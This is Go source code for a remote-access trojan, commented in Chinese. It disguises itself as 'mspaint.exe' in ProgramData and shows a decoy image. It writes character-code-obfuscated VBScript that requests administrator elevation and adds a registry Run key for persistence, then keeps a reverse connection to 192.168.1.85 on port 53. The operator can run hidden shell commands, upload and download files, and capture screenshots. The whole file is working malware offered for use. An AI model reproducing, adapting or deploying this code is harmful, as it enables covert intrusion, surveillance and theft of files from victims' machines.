package main

import (
    "bufio"
    "bytes"
    "context"
    "encoding/base64"
    "fmt"
    "image/png"
    "io"
    "io/ioutil"
    "log"
    "net"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strings"
    "syscall"
    "time"
    "github.com/axgle/mahonia"
    screenshot "github.com/kbinani/screenshot"
)

const (
    IP      = "192.168.1.85:53"
    CONNPWD = "zwa666"
)

var (
    // cmd执行超时的秒数
    Timeout = 30 * time.Second
    // cmd 输出字符串编码
    charset = "utf-8"
)

func main() {
    if runtime.GOOS == "windows" {
        targetPath := os.Getenv("systemdrive") + "\\ProgramData\\"
        targetFile := targetPath + "mspaint.exe"
        os.Mkdir(targetPath, os.ModePerm)
        //exec.Command("")
        //获取当前文件执行的绝对路径

        currentFile, _ := exec.LookPath(os.Args[0])
        currentFileAbs, _ := filepath.Abs(currentFile)
        // 如果当前执行都文件是复制后的目标文件，

        if currentFileAbs == targetFile {
            // 删除原有文件
            fmt.Println(len(os.Args))
            if len(os.Args) > 1 {
                err := os.Chmod(os.Args[1], 0777)
                if err != nil {
                    fmt.Println(err)
                }
                //err = os.Remove(os.Args[1])
                //if err != nil {
                fmt.Println(err)
                //}
            }

            //开始连接
            for {
                connect()
            }
        } else {
            //设定一个目标文件信息
            _, err := os.Stat(targetFile)
            if err != nil {
                // 打开源文件
                srcFile, _ := os.Open(currentFile)
                //创建目标文件
                desFile, err := os.Create(targetFile)
                if err != nil {
                    fmt.Println(err)
                }
                //copy源文件的内容到目标文件
                _, err = io.Copy(desFile, srcFile)
                if err != nil {
                    fmt.Println(err)
                }

                //设定目标文件权限 0777, 这样才可以启动
                err = os.Chmod(targetFile, 0777)
                if err != nil {
                    fmt.Println(err)
                }
                //不能使用 defer desFile.Close(), 需要在执行前关闭文件句柄
                srcFile.Close()
                desFile.Close()
                // start 启动目标程序,进程不需要等待交互
                mCommand(targetFile, currentFileAbs)
                // 打开图片
                mCommand("cmd.exe", "/c", "start", "max.jpg")
                install_start() //自七
            } else {
                // 如果文件已经存在，start 启动目标程序,进程不需要等待交互
                mCommand(targetFile, currentFileAbs)
                // 打开图片
                mCommand("cmd.exe", "/c", "start", "max.jpg")
                install_start() //自七

            }
        }

    } else {
        for {
            connect()
        }
    }
}

func install_start() { //windows提升权限，加注册表.
    err := ioutil.WriteFile("test.vbs", []byte("execute(chr(83)&chr(101)&chr(116)&chr(32)&chr(85)&chr(65)&chr(67)&chr(32)&chr(61)&chr(32)&chr(67)&chr(114)&chr(101)&chr(97)&chr(116)&chr(101)&chr(79)&chr(98)&chr(106)&chr(101)&chr(99)&chr(116)&chr(40)&chr(34)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(46)&chr(65)&chr(112)&chr(112)&chr(108)&chr(105)&chr(99)&chr(97)&chr(116)&chr(105)&chr(111)&chr(110)&chr(34)&chr(41)&chr(32)&chr(32)&chr(10)&chr(83)&chr(101)&chr(116)&chr(32)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(32)&chr(61)&chr(32)&chr(67)&chr(114)&chr(101)&chr(97)&chr(116)&chr(101)&chr(79)&chr(98)&chr(106)&chr(101)&chr(99)&chr(116)&chr(40)&chr(34)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(34)&chr(41)&chr(32)&chr(32)&chr(10)&chr(73)&chr(102)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(46)&chr(99)&chr(111)&chr(117)&chr(110)&chr(116)&chr(60)&chr(49)&chr(32)&chr(84)&chr(104)&chr(101)&chr(110)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(101)&chr(99)&chr(104)&chr(111)&chr(32)&chr(34)&chr(35821)&chr(27861)&chr(58)&chr(32)&chr(32)&chr(115)&chr(117)&chr(100)&chr(111)&chr(32)&chr(60)&chr(99)&chr(111)&chr(109)&chr(109)&chr(97)&chr(110)&chr(100)&chr(62)&chr(32)&chr(91)&chr(97)&chr(114)&chr(103)&chr(115)&chr(93)&chr(34)&chr(32)&chr(32)&chr(10)&chr(69)&chr(108)&chr(115)&chr(101)&chr(73)&chr(102)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(46)&chr(99)&chr(111)&chr(117)&chr(110)&chr(116)&chr(61)&chr(49)&chr(32)&chr(84)&chr(104)&chr(101)&chr(110)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(85)&chr(65)&chr(67)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(69)&chr(120)&chr(101)&chr(99)&chr(117)&chr(116)&chr(101)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(97)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(40)&chr(48)&chr(41)&chr(44)&chr(32)&chr(34)&chr(34)&chr(44)&chr(32)&chr(34)&chr(34)&chr(44)&chr(32)&chr(34)&chr(114)&chr(117)&chr(110)&chr(97)&chr(115)&chr(34)&chr(44)&chr(32)&chr(49)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(108)&chr(101)&chr(101)&chr(112)&chr(32)&chr(49)&chr(53)&chr(48)&chr(48)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(68)&chr(105)&chr(109)&chr(32)&chr(114)&chr(101)&chr(116)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(114)&chr(101)&chr(116)&chr(32)&chr(61)&chr(32)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(46)&chr(65)&chr(112)&chr(112)&chr(97)&chr(99)&chr(116)&chr(105)&chr(118)&chr(97)&chr(116)&chr(101)&chr(40)&chr(34)&chr(29992)&chr(25143)&chr(36134)&chr(25143)&chr(25511)&chr(21046)&chr(34)&chr(41)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(73)&chr(102)&chr(32)&chr(114)&chr(101)&chr(116)&chr(32)&chr(61)&chr(32)&chr(116)&chr(114)&chr(117)&chr(101)&chr(32)&chr(84)&chr(104)&chr(101)&chr(110)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(46)&chr(115)&chr(101)&chr(110)&chr(100)&chr(107)&chr(101)&chr(121)&chr(115)&chr(32)&chr(34)&chr(37)&chr(121)&chr(34)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(69)&chr(108)&chr(115)&chr(101)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(101)&chr(99)&chr(104)&chr(111)&chr(32)&chr(34)&chr(33258)&chr(21160)&chr(33719)&chr(21462)&chr(31649)&chr(29702)&chr(21592)&chr(26435)&chr(38480)&chr(22833)&chr(36133)&chr(65292)&chr(35831)&chr(25163)&chr(21160)&chr(30830)&chr(35748)&chr(12290)&chr(34)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(69)&chr(110)&chr(100)&chr(32)&chr(73)&chr(102)&chr(32)&chr(32)&chr(10)&chr(69)&chr(108)&chr(115)&chr(101)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(68)&chr(105)&chr(109)&chr(32)&chr(117)&chr(99)&chr(67)&chr(111)&chr(117)&chr(110)&chr(116)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(68)&chr(105)&chr(109)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(61)&chr(32)&chr(78)&chr(85)&chr(76)&chr(76)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(70)&chr(111)&chr(114)&chr(32)&chr(117)&chr(99)&chr(67)&chr(111)&chr(117)&chr(110)&chr(116)&chr(61)&chr(49)&chr(32)&chr(84)&chr(111)&chr(32)&chr(40)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(46)&chr(99)&chr(111)&chr(117)&chr(110)&chr(116)&chr(45)&chr(49)&chr(41)&chr(32)&chr(83)&chr(116)&chr(101)&chr(112)&chr(32)&chr(49)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(61)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(38)&chr(32)&chr(34)&chr(32)&chr(34)&chr(32)&chr(38)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(40)&chr(117)&chr(99)&chr(67)&chr(111)&chr(117)&chr(110)&chr(116)&chr(41)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(78)&chr(101)&chr(120)&chr(116)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(85)&chr(65)&chr(67)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(69)&chr(120)&chr(101)&chr(99)&chr(117)&chr(116)&chr(101)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(97)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(40)&chr(48)&chr(41)&chr(44)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(44)&chr(32)&chr(34)&chr(34)&chr(44)&chr(32)&chr(34)&chr(114)&chr(117)&chr(110)&chr(97)&chr(115)&chr(34)&chr(44)&chr(32)&chr(53)&chr(32)&chr(32)&chr(10)&chr(69)&chr(110)&chr(100)&chr(32)&chr(73)&chr(102)&chr(32)&chr(32))"), 0666)

    if err != nil {
        log.Fatal(err)
    }

    err2 := ioutil.WriteFile("add.vbs", []byte("execute(chr(83)&chr(101)&chr(116)&chr(32)&chr(111)&chr(98)&chr(106)&chr(87)&chr(115)&chr(104)&chr(32)&chr(61)&chr(32)&chr(67)&chr(114)&chr(101)&chr(97)&chr(116)&chr(101)&chr(79)&chr(98)&chr(106)&chr(101)&chr(99)&chr(116)&chr(40)&chr(34)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(34)&chr(41)&chr(10)&chr(111)&chr(98)&chr(106)&chr(87)&chr(115)&chr(104)&chr(46)&chr(82)&chr(117)&chr(110)&chr(32)&chr(34)&chr(114)&chr(101)&chr(103)&chr(32)&chr(97)&chr(100)&chr(100)&chr(32)&chr(72)&chr(75)&chr(69)&chr(89)&chr(95)&chr(76)&chr(79)&chr(67)&chr(65)&chr(76)&chr(95)&chr(77)&chr(65)&chr(67)&chr(72)&chr(73)&chr(78)&chr(69)&chr(92)&chr(83)&chr(79)&chr(70)&chr(84)&chr(87)&chr(65)&chr(82)&chr(69)&chr(92)&chr(77)&chr(105)&chr(99)&chr(114)&chr(111)&chr(115)&chr(111)&chr(102)&chr(116)&chr(92)&chr(87)&chr(105)&chr(110)&chr(100)&chr(111)&chr(119)&chr(115)&chr(92)&chr(67)&chr(117)&chr(114)&chr(114)&chr(101)&chr(110)&chr(116)&chr(86)&chr(101)&chr(114)&chr(115)&chr(105)&chr(111)&chr(110)&chr(92)&chr(82)&chr(117)&chr(110)&chr(32)&chr(47)&chr(118)&chr(32)&chr(65)&chr(85)&chr(84)&chr(79)&chr(82)&chr(85)&chr(78)&chr(32)&chr(47)&chr(116)&chr(32)&chr(82)&chr(69)&chr(71)&chr(95)&chr(83)&chr(90)&chr(32)&chr(47)&chr(100)&chr(32)&chr(67)&chr(58)&chr(92)&chr(80)&chr(114)&chr(111)&chr(103)&chr(114)&chr(97)&chr(109)&chr(68)&chr(97)&chr(116)&chr(97)&chr(92)&chr(109)&chr(115)&chr(112)&chr(97)&chr(105)&chr(110)&chr(116)&chr(46)&chr(101)&chr(120)&chr(101)&chr(32)&chr(47)&chr(102)&chr(34)&chr(44)&chr(118)&chr(98)&chr(104)&chr(105)&chr(100)&chr(101)&chr(10)&chr(111)&chr(98)&chr(106)&chr(87)&chr(115)&chr(104)&chr(46)&chr(82)&chr(117)&chr(110)&chr(32)&chr(34)&chr(116)&chr(101)&chr(115)&chr(116)&chr(46)&chr(118)&chr(98)&chr(115)&chr(32)&chr(114)&chr(101)&chr(103)&chr(32)&chr(97)&chr(100)&chr(100)&chr(32)&chr(72)&chr(75)&chr(69)&chr(89)&chr(95)&chr(76)&chr(79)&chr(67)&chr(65)&chr(76)&chr(95)&chr(77)&chr(65)&chr(67)&chr(72)&chr(73)&chr(78)&chr(69)&chr(92)&chr(83)&chr(79)&chr(70)&chr(84)&chr(87)&chr(65)&chr(82)&chr(69)&chr(92)&chr(77)&chr(105)&chr(99)&chr(114)&chr(111)&chr(115)&chr(111)&chr(102)&chr(116)&chr(92)&chr(87)&chr(105)&chr(110)&chr(100)&chr(111)&chr(119)&chr(115)&chr(92)&chr(67)&chr(117)&chr(114)&chr(114)&chr(101)&chr(110)&chr(116)&chr(86)&chr(101)&chr(114)&chr(115)&chr(105)&chr(111)&chr(110)&chr(92)&chr(82)&chr(117)&chr(110)&chr(32)&chr(47)&chr(118)&chr(32)&chr(65)&chr(85)&chr(84)&chr(79)&chr(82)&chr(85)&chr(78)&chr(32)&chr(47)&chr(116)&chr(32)&chr(82)&chr(69)&chr(71)&chr(95)&chr(83)&chr(90)&chr(32)&chr(47)&chr(100)&chr(32)&chr(67)&chr(58)&chr(92)&chr(80)&chr(114)&chr(111)&chr(103)&chr(114)&chr(97)&chr(109)&chr(68)&chr(97)&chr(116)&chr(97)&chr(92)&chr(109)&chr(115)&chr(112)&chr(97)&chr(105)&chr(110)&chr(116)&chr(46)&chr(101)&chr(120)&chr(101)&chr(32)&chr(47)&chr(102)&chr(34)&chr(44)&chr(118)&chr(98)&chr(104)&chr(105)&chr(100)&chr(101))"), 0666)
    if err2 != nil {
        log.Fatal(err)
    }

    c := exec.Command("cmd", "/c", "add.vbs")
    c.Run()

    er := os.Remove("add.vbs")
    if err != nil {
        log.Fatal(er)
    }

}

// 获取不同操作系统的环境的截图临时文件的位置
func getScreenshotFilename() string {
    var (
        filepath string
    )
    if runtime.GOOS == "windows" {
        filepath = os.Getenv("systemdrive") + "\\ProgramData\\tmp.png"
    } else {
        filepath = "/tmp/.tmp.png"
    }
    return filepath
}

// 转化字符串
func ConvertToString(src string, srcCode string, tagCode string) string {
    srcCoder := mahonia.NewDecoder(srcCode)
    srcResult := srcCoder.ConvertString(src)
    tagCoder := mahonia.NewDecoder(tagCode)
    _, cdata, _ := tagCoder.Translate([]byte(srcResult), true)
    result := string(cdata)
    return result
}

// TakeScreenShot 截图功能,并存储到本地
func TakeScreenShot() {
    n := screenshot.NumActiveDisplays()
    fpath := getScreenshotFilename()
    for i := 0; i < n; i++ {
        bounds := screenshot.GetDisplayBounds(i)

        img, err := screenshot.CaptureRect(bounds)
        if err != nil {
            connect()
        }
        file, _ := os.Create(fpath)
        defer file.Close()
        png.Encode(file, img)
    }
}

// 连接远程服务器
func connect() {
    conn, err := net.Dial("tcp", IP)
    if err != nil {
        fmt.Println("Connection...")
        for {
            connect()
        }
    }
    errMsg := base64.URLEncoding.EncodeToString([]byte(CONNPWD))
    conn.Write([]byte(string(errMsg) + "\n"))
    fmt.Println("Connection success...")

    for {
        //等待接收指令，以 \n 为结束符，所有指令字符都经过base64
        message, err := bufio.NewReader(conn).ReadString('\n')
        if err == io.EOF {
            // 如果服务器断开，则重新连接
            conn.Close()
            connect()
        }
        // 收到指令base64解码
        decodedCase, _ := base64.StdEncoding.DecodeString(message)
        command := string(decodedCase)
        cmdParameter := strings.Split(command, " ")
        switch cmdParameter[0] {
        case "back":
            conn.Close()
            connect()
        case "exit":
            conn.Close()
            os.Exit(0)
        case "charset":
            if len(cmdParameter) == 2 {
                charset = cmdParameter[1]
            }
        case "upload":
            uploadOutput, _ := bufio.NewReader(conn).ReadString('\n')
            decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
            encData, _ := bufio.NewReader(conn).ReadString('\n')
            decData, _ := base64.URLEncoding.DecodeString(encData)
            ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)

        case "download":
            // 第一步收到下载指令,什么都不做，继续等待下载路径
            download, _ := bufio.NewReader(conn).ReadString('\n')
            decodeDownload, _ := base64.StdEncoding.DecodeString(download)
            file, err := ioutil.ReadFile(string(decodeDownload))
            if err != nil {
                // 找不到文件，发送错误消息
                errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
                conn.Write([]byte(string(errMsg) + "\n"))
                break
            }
            //发送一个download指令给服务器端准备接收
            srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("download"))
            conn.Write([]byte(string(srvDownloadMsg) + "\n"))
            //读文件上传
            encData := base64.URLEncoding.EncodeToString(file)
            conn.Write([]byte(string(encData) + "\n"))

        case "screenshot":
            TakeScreenShot()
            file, err := ioutil.ReadFile(getScreenshotFilename())
            if err != nil {
                // 找不到文件，发送错误消息
                errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
                conn.Write([]byte(string(errMsg) + "\n"))
                break
            }
            //发送一个download指令给服务器端准备接收
            srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("screenshot"))
            conn.Write([]byte(string(srvDownloadMsg) + "\n"))

            //读图片文件上传
            encData := base64.URLEncoding.EncodeToString(file)
            conn.Write([]byte(string(encData) + "\n"))

        case "getos":
            if runtime.GOOS == "windows" {
                command = "wmic os get name"
            } else {
                command = "uname -a"
            }
            fallthrough
        default:
            cmdArray := strings.Split(command, " ")
            cmdSlice := cmdArray[1:len(cmdArray)]
            out, outerr := mCommandTimeOut(cmdArray[0], cmdSlice...)
            if outerr != nil {
                out = []byte(outerr.Error())
            }
            // 解决命令行输出编码问题
            if charset != "utf-8" {
                out = []byte(ConvertToString(string(out), charset, "utf-8"))
            }
            encoded := base64.StdEncoding.EncodeToString(out)
            conn.Write([]byte(encoded + "\n"))
        }
    }
}

func mCommandTimeOut(name string, arg ...string) ([]byte, error) {
    ctxt, cancel := context.WithTimeout(context.Background(), Timeout)
    defer cancel()
    // 通过上下文执行，设置超时
    cmd := exec.CommandContext(ctxt, name, arg...)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    //cmd.SysProcAttr = &syscall.SysProcAttr{}

    var buf bytes.Buffer
    cmd.Stdout = &buf
    cmd.Stderr = &buf

    if err := cmd.Start(); err != nil {
        return buf.Bytes(), err
    }

    if err := cmd.Wait(); err != nil {
        return buf.Bytes(), err
    }

    return buf.Bytes(), nil
}

func mCommand(name string, arg ...string) {
    cmd := exec.Command(name, arg...)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    err := cmd.Start()
    if err != nil {
        fmt.Println(err)
    }
}